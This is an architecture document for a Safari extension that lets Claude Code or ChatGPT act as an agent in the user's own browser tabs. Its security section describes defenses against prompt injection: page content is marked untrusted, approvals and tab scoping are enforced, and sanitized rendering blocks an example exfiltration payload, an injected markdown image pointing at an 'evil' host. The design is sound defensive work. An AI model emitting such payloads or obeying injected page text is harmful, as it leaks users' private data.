# Architecture

## Overview

```
┌──────────────────────────── Safari ────────────────────────────┐
│  web page ── content.js (isolated world)                        │
│              ├─ DOM tools: a11y tree, find, click, type, …      │
│              └─ floating panel host ── iframe panel.html        │
│                                               (React UI)        │
│                         ▲ scripting.executeScript │ runtime Port │
│  background.js  ◄───────┴──────────────────────┘                │
│   ├─ tool executor (agent-tab binding, approvals, navigation,   │
│   │   tabs, screenshots via tabs.captureVisibleTab)             │
│   └─ helper connection ──┐                                      │
│  SafariAgentExtension.appex (sandboxed)                         │
│   └─ sendNativeMessage → returns helper port + per-launch secret│
└──────────────────────────┼──────────────────────────────────────┘
                           │ WebSocket ws://127.0.0.1:<random port>
                           │ (Origin must be safari-web-extension://, token auth)
┌──────────────────────────▼─── Safari Agent.app (menu bar helper) ┐
│ Hub: conversations (0600 JSON), runs, tool routing, approvals     │
│ ├─ ClaudeProvider: `claude -p` stream-json session per chat ──────┼─► Claude Code CLI (user's own login)
│ │     └─ MCP stdio server = `Safari Agent --mcp-bridge` ◄─────────┤   built-in tools disabled (--tools "")
│ └─ ChatGPTProvider: Sign in with ChatGPT (PKCE, loopback          │
│       callback, RS256 ID-token check, Keychain) + Responses API   ├─► api.openai.com/v1/responses (plan usage)
│       streaming function-calling loop                             │
└───────────────────────────────────────────────────────────────────┘
```

All browser actions run in the user's **real** Safari tabs through the extension. Both providers use the same tool catalog (`extension/src/shared/tools.ts`):
- For Claude, the catalog is exposed as MCP tools by the bridge.
- For ChatGPT, it is sent as Responses API function tools.

## Key decisions (with evidence)

| Question | Finding on this machine | Decision |
|---|---|---|
| Can the Claude subscription power an agent without an API key? | `claude auth status` reports `authMethod: claude.ai`. `claude -p --input-format/--output-format stream-json` streams real answers, calls MCP tools, keeps context across turns, and accepts `control_request: interrupt` | Drive the unmodified CLI as a subprocess with a clean environment, `--tools ""`, `--strict-mcp-config`, `--setting-sources ""`, `--permission-prompts none` and our own system prompt. `--bare` is not used because it disables keychain (subscription) auth |
| Safari MCP (`safaridriver --mcp`) | Its tools need a WebDriver session (“Allow remote automation”), and WebDriver sessions run in isolated automation windows | Not usable for the user's own tabs and logins. All tools are implemented in the extension instead |
| Native side panel in Safari 27? | `safari-web-extension-packager` warns that `side_panel` and `persistent` are unsupported | A page-attached panel: a shadow-DOM host plus an extension iframe, a floating glass card that pushes page content. A separate window serves as fallback on pages that can't host it |
| How does the sandboxed extension reach a non-sandboxed helper? | Native messaging only reaches the sandboxed app extension. App Groups would need a shared team container, and the design had to work with ad-hoc builds too | The helper writes `{port, token}` to `~/Library/Application Support/SafariAgent/connection.json` (0600). The appex reads it through a read-only temporary-exception entitlement and returns it to the background script, which opens an authenticated loopback WebSocket |
| ChatGPT without an API key | SIWC docs plus the official DevKit: `dynamic_agent_client` registration, scopes `openid profile email offline_access resource.invoke chatgpt.tokens.use.direct`, loopback redirect `http://127.0.0.1:1455/auth/callback`, `GET /v1/models`, `POST /v1/responses` with `store:false, stream:true` | Implemented natively in Swift (no Node runtime): ID token verified with JWKS/RS256, tokens in the login Keychain, rotating refresh, function tools in a `namespace` with a plain-function fallback, reasoning effort with a fallback |

## Security model

- **Loopback only**: the listener is bound to `127.0.0.1` with interface type loopback. Peers that aren't loopback are dropped.
- **No web access**: WebSocket handshakes whose `Origin` is a web page are refused. Browsers always send `Origin`, so websites can't connect. Every client must also present the per-launch secret, compared in constant time. MCP bridges get a separate per-conversation token and can only call tools for their own conversation.
- **No credential leakage**:
  - Claude Code runs with a clean environment: no `ANTHROPIC_*` variables and no inherited host session.
  - ChatGPT tokens live in the Keychain and are never logged. Logs (`os.Logger`) contain no prompts, page content or tokens.
- **Untrusted content**:
  - Tool output is wrapped in `<page_content untrusted="true">`, and the system prompt says page text is never an instruction.
  - Markdown rendering is sanitized (DOMPurify) and drops images, so injected `![](https://evil/?q=secret)` can't exfiltrate data.
- **Agent restrictions**:
  - The agent refuses password, one-time-code and payment fields; their values are redacted in page snapshots.
  - Navigation is limited to http(s).
- **Approvals** are enforced in the extension, independent of the model:
  - The policy (`background/policy.ts`) inspects the real element (submit buttons, sensitive labels in English and German, logout/delete links, Enter in forms, closing tabs).
  - If no panel is open to ask, the action is denied.
- **Tab safety**: every conversation is bound to the tab the user was viewing when they sent the message. Tools act on that tab even if the user switches tabs.
- **Tab access scope**, enforced in the extension's executor, not by the prompt:
  - **This tab only** (default): the agent can use only the tabs the conversation was sent from and tabs it opened itself. `tabs_list` hides all others, and explicit `tabId`s for them are refused.
  - **All tabs in this window**: any tab in the same window.
- **Stale references**: element refs carry a per-document id, so a ref from a previous page can never hit an element on a new page.

## Reliability

- **Background lifecycle**:
  - The background script is non-persistent (MV3). Every content script says `hello` on load and when its tab becomes visible, which wakes the background and reconnects it to the helper.
  - The panel keeps a runtime Port open and pings every 20 seconds.
- **Per-tab sidebar**: the open state is kept per tab. The sidebar follows the agent into tabs it opens or switches to.
- **Making room**:
  - `html{margin-right}` pushes normal page flow.
  - Fixed layers that reach under the sidebar are adjusted:
    - Wide layers (at least 40 % of the viewport, e.g. app shells and headers) are pinned at their current left edge and narrowed.
    - Small layers (buttons, widgets) are shifted left.
  - In-flow elements that are exactly `100vw` wide are capped to the remaining width. This is what full-viewport apps like chatgpt.com need.
  - All adjustments use `!important` inline styles that are restored exactly on close. They are re-checked on DOM mutations, on resize and every 2 seconds.
- **Background→page calls** don't use `tabs.sendMessage`, which Safari sometimes stops delivering to a tab. Instead, `background/tabrpc.ts` runs a tiny function through `scripting.executeScript` that calls the handler the content script registered in its isolated world (`window.__safariAgentHandle`), re-injecting `content.js` when it is missing or orphaned.
- **Stale content scripts**:
  - After an extension reload, tabs keep orphaned scripts. Tool calls and panel-show detect missing receivers, re-inject `content.js`, and the new instance replaces the old one in the same world.
  - Orphaned scripts remove their own dead panel.
- **Helper**: single instance. The connection file is only removed by the instance that owns it. Keychain reads are lazy and off the main thread, so a Keychain prompt can't block startup.
- **Claude sessions**:
  - One `claude -p` process per conversation, idle-terminated after 15 minutes and resumed with `--resume <session_id>`.
  - Model or effort changes restart the process with resume.
  - Cancel sends an `interrupt` control request, killing the process after 6 seconds if needed.
  - Auth and usage-limit errors are mapped to readable messages.
- **ChatGPT turns**:
  - Access tokens are refreshed 90 seconds before expiry or on a 401.
  - Dangling function calls are closed on cancel or error.
  - Screenshots are stripped from persisted history, and history is capped.
- **Tool calls**: time out after 6 minutes (approvals wait up to 5). If the extension disconnects, pending calls fail with a clear error.

## Signing and installation

- **Signing**: `scripts/build.sh` signs with the Apple Development certificate's team (automatic signing, `-allowProvisioningUpdates`).
  - A stable team signature makes Safari keep the extension enabled across restarts, and the Keychain keeps the helper's "Always Allow".
  - Without a certificate, the build falls back to ad-hoc signing, which needs "Allow unsigned extensions" after every Safari launch.
- **Copying**: builds are copied with `ditto --norsrc --noextattr --noacl`. Extended attributes break strict signature verification ("resource fork, Finder information, or similar detritus not allowed").
- **Registration**: only one app copy is registered with LaunchServices: the installed one in `~/Applications`, or `build/` if nothing is installed.

## Reference archive: what was reused conceptually

The archive (`Chrome-Extensions/`) was used read-only as a reference. No code, assets or keys were copied.

- **Claude in Chrome 1.0.107**: MV3 service worker, Chrome `sidePanel`, `debugger` (CDP input), `tabGroups`, `nativeMessaging`, and an `accessibility-tree.js` content script that builds a ref-addressed tree with `WeakRef` maps and redacts sensitive fields.
  - Reused ideas: the ref-addressed accessibility tree (reimplemented in `content/dom-tools.ts` with per-document ref ids), sensitive-field redaction, the find-by-description approach, the agent visual indicator, and tool names close to Claude in Chrome's (`read_page`, `find`, `form_input`, `navigate`, `get_page_text`).
  - New for Safari: Safari has no `sidePanel`, no `debugger`/CDP and no `tabGroups`, and its native messaging only reaches the app extension. Input is therefore synthesized in the DOM (pointer, mouse and keyboard events, native value setters, `execCommand` for contenteditable). Tab scoping uses agent-tab binding instead of a tab group. The model connection goes through a local helper.
- **ChatGPT extension 1.26**: an MV3 side panel (`codex-work-sidepanel`), browser-accessibility chunks and a localhost connector to a desktop app.
  - Reused idea: talk to a local native process over loopback instead of running the agent in the browser.
  - Not reused: web-session (chatgpt.com) endpoints. Sign in with ChatGPT plus the public Responses API is used instead.
